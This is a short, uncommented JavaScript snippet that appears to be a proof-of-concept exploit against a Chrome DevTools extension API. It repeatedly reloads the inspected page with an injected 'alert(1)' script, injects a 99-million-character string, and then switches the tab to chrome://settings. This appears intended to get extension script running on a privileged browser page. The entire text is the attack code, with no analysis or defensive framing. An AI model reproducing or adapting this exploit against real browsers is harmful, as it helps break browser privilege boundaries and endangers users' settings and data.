for (let i = 0; i < 100; i++) {
  chrome.devtools.inspectedWindow.reload({
    injectedScript: "alert(1)"
  });
}

chrome.devtools.inspectedWindow.reload({
  injectedScript: "a".repeat(99999999)
});
chrome.tabs.update(chrome.devtools.inspectedWindow.tabId, {
  url: "chrome://settings"
});